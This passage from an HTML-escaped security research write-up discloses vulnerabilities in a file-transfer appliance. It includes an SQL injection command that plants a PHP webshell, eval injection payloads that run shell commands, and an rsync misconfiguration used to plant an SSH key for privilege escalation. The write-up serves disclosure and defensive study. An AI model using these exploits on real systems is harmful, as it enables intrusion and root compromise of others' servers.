In the function &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;construct_where_clause( ... )&lt;/code&gt;, every parameter is protected by the string &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mysql_real_escape_string&lt;/code&gt; except for &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;$client_id&lt;/code&gt;. Judging from the coding style of the source code, it might be a result of oversight. Therefore, SQL Injection can be triggered by sending out corresponding parameters according to the program flow.&lt;/p&gt;

&lt;p&gt;In addition, FTA database user has root privileges with FILE_PRIV option enabled. By exploiting &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;INTO OUTFILE&lt;/code&gt; and writing their own PHP code to write-enabled directory, user will be able to execute code remotely!&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;PoC&lt;/strong&gt;&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;curl https://&amp;lt;fta&amp;gt;/courier/1000@/security_key2.api &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;aid=1000&amp;amp;user_id=1&amp;amp;password=1&amp;amp;client_id=&apos; OR 1=1 LIMIT 1 INTO OUTFILE &apos;/home/seos/courier/themes/templates/.cc.php&apos; LINES TERMINATED BY 0x3c3f...#&quot;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;The created PHP file will be located at&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;http://&amp;lt;fta&amp;gt;/courier/themes/templates/.cc.php&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h4 id=&quot;known-secret-key-leads-to-remote-code-execution&quot;&gt;Known-Secret-Key leads to Remote Code Execution&lt;/h4&gt;

&lt;p&gt;In the previous vulnerability, one requirement to execute code remotely is the existence of a write-enabled directory for injecting webshell. But in reality, chances are there is no write-enabled directory available, thus fail to execute code through SQL Injection. But there is another way to help us accomplish RCE.&lt;/p&gt;

&lt;p&gt;The precondition of this vulnerability is &lt;strong&gt;Known-Secret-Key stored in the database&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;This is not a problem, since the database can be accessed with the SQL Injection vulnerability mentioned earlier. Also, although there are some parameter filters in the code, they can be bypassed!&lt;/p&gt;

&lt;div class=&quot;highlight-name&quot;&gt;/home/seos/courier/sfUtils.api&lt;/div&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;nv&quot;&gt;$func_call&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;decrypt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$_POST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;fc&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$orig_func&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;preg_match&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;/(.+)\(.*\)/&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$func_call&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$func_match&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;nv&quot;&gt;$orig_func&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$func_call&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;nv&quot;&gt;$func_call&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$func_match&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$cs_method&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;array&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;delete_session_cache&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;delete_user_contact&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;valid_password&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;user_password_update_disallowed&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;user_password_format_disallowed&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;get_user_contact_list&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;user_email_verified&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;user_exist_allow_direct_download&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;user_profile_auth&apos;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;((&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$func_call&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;in_array&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$func_call&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$cs_method&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$orig_func&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;nv&quot;&gt;$func_call&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$orig_func&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$func_call&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;get_user_contact_list&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_csinfo&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;user_id&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;preg_match&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;/[\\\/&quot;\*\:\?\&amp;lt;\&amp;gt;\|&amp;amp;]/&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$_POST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;name&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;nv&quot;&gt;$func_call&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;echo(count(&apos;&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$func_call&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;(&quot;&apos;&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$_csinfo&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;user_id&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;&quot;, array(&quot;nickname&quot;=&amp;gt;&quot;&apos;&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;addslashes&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$_POST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;name&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;&quot;))));&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;isset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$_POST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;p1&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;nv&quot;&gt;$func_param&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;array&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;  &lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;nv&quot;&gt;$p_no&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;7&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

        &lt;span class=&quot;k&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;isset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$_POST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;p&apos;&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$p_no&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;nv&quot;&gt;$func_param&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;str_replace&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;\&apos;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;\\\&apos;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;str_replace&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;$&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;\\$&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;addslashes&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$_POST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;p&apos;&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$p_no&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
            &lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$p_no&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
        &lt;span class=&quot;nv&quot;&gt;$func_call&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;echo(&apos;&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$func_call&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;(&quot;&apos;&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;join&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;&quot;, &quot;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$func_param&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;&quot;));&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;eval&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$func_call&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;If Known-Secret-Key has been acquired, the output of decrypt( $_POST[fc] ) will be controllable. And despite that the succeeding regular expressions work as a function name whitelist filter, they do not filter parameters.&lt;br /&gt;
Therefore, the only restriction for injecting random codes in the parameters is to exclude &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;(&lt;/code&gt; &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;)&lt;/code&gt; in the strings. But thanks to the flexible characteristic of PHP, there are lots of ways to manipulate, just to name two examples here.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;
Execute system commands directly by using backticks (`)&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;user_profile_auth(`$_POST[cmd]`);
&lt;br /&gt;&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;A more elegant way: use the syntax INCLUDE to include the tmp_name of the uploaded files, so that any protection will give way.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;user_profile_auth(include $_FILES[file][tmp_name]);&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h4 id=&quot;local-privilege-escalation-cve-2016-2352-and-cve-2016-2353&quot;&gt;Local Privilege Escalation (CVE-2016-2352 and CVE-2016-2353)&lt;/h4&gt;
&lt;p&gt;After gaining PHP page privileges, we discovered that the privileges were assigned to user nobody. In order to engage in advanced recon, the web environment had been observed. After the observation, two possible privilege escalation vulnerabilities were identified.&lt;/p&gt;

&lt;h5 id=&quot;1-incorrect-rsync-configuration&quot;&gt;1. Incorrect Rsync Configuration&lt;/h5&gt;

&lt;div class=&quot;highlight-name&quot;&gt;/etc/opt/rsyncd.conf&lt;/div&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-lighttpd&quot; data-lang=&quot;lighttpd&quot;&gt;log file = /home/soggycat/log/kennel.log
...
[soggycat]
path = /home/soggycat
uid = soggycat
read only = false
list = false
...&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;The module name soggycat is readable and writable to anyone for the directory &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/home/soggycat/&lt;/code&gt;, therefore the SSH Key can be written into &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/home/soggycat/.ssh/&lt;/code&gt; and then use the soggycat credential to login.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;bash-3.2&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;id
&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;uid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;99&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;nobody&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;gid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;99&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;nobody&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;groups&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;99&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;nobody&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;

bash-3.2&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;rsync 0::soggycat/.ssh/
drwx------        4096 2016/01/29 18:13:41 &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;         606 2016/01/29 18:13:41 authorized_keys

bash-3.2&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;rsync 0::soggycat/.ssh/authorized_keys &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
bash-3.2&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;id_dsa.pub &lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt; authorized_keys
bash-3.2&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;rsync authorized_keys 0::soggycat/.ssh/

bash-3.2&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;ssh &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; id_dsa &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;UserKnownHostsFile&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/dev/null &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;StrictHostKeyChecking&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;no soggycat@localhost &lt;span class=&quot;nb&quot;&gt;id
&lt;/span&gt;Could not create directory &lt;span class=&quot;s1&quot;&gt;&apos;/.ssh&apos;&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
Warning: Permanently added &lt;span class=&quot;s1&quot;&gt;&apos;0,0.0.0.0&apos;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;RSA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; to the list of known hosts.
&lt;span class=&quot;nv&quot;&gt;uid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;520&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;soggycat&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;gid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;99&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;nobody&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;groups&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;99&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;nobody&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h5 id=&quot;2-command-injection-in-yum-clientpl&quot;&gt;2. Command Injection in “yum-client.pl”&lt;/h5&gt;

&lt;p&gt;To enable system updates through web UI, the sudoers configuration in FTA exceptionally allows the user nobody to directly execute commands with root privileges and update software with the program &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;yum-client.pl&lt;/code&gt;.&lt;/p&gt;

&lt;div class=&quot;highlight-name&quot;&gt;/etc/sudoers&lt;/div&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-apache&quot; data-lang=&quot;apache&quot;&gt;&lt;span class=&quot;err&quot;&gt;...&lt;/span&gt;
Cmnd_Alias      YUM_UPGRADE = /usr/bin/yum -y upgrade
Cmnd_Alias      YUM_CLIENT = /usr/local/bin/yum-client.pl
&lt;span class=&quot;err&quot;&gt;...&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# User privilege specification&lt;/span&gt;
root     ALL=(ALL) &lt;span class=&quot;ss&quot;&gt;ALL&lt;/span&gt;
admin    &lt;span class=&quot;ss&quot;&gt;ALL&lt;/span&gt; =NOPASSWD: UPDATE_DNS, UPDATE_GW, UPDATE_NTP, RESTART_NETWORK, CHMOD_OLDTEMP ...
nobody   &lt;span class=&quot;ss&quot;&gt;ALL&lt;/span&gt; =NOPASSWD: SSL_SYSTEM, ADMIN_SYSTEM, IPSEC_CMD, YUM_CLIENT
soggycat &lt;span class=&quot;ss&quot;&gt;ALL&lt;/span&gt; =NOPASSWD: ADMIN_SYSTEM, IPSEC_CMD, CHOWN_IPSEC, UPDATE_IPSEC, YUM_CLIENT
radmin   &lt;span class=&quot;ss&quot;&gt;ALL&lt;/span&gt; =NOPASSWD: RESET_APPL
&lt;span class=&quot;err&quot;&gt;...&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;YUM_CLIENT&lt;/code&gt; is the command for proceeding updates. Part of the codes are as follows:&lt;/p&gt;

&lt;div class=&quot;highlight-name&quot;&gt;/usr/local/bin/yum-client.pl&lt;/div&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-perl&quot; data-lang=&quot;perl&quot;&gt;&lt;span class=&quot;o&quot;&gt;...&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;GetOptions&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
   &lt;span class=&quot;p&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;help&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&apos;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$help&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
   &lt;span class=&quot;p&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;download_only&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&apos;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$download_only&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
   &lt;span class=&quot;p&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;list&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&apos;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$list&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
   &lt;span class=&quot;p&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;cache&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&apos;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$cache&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
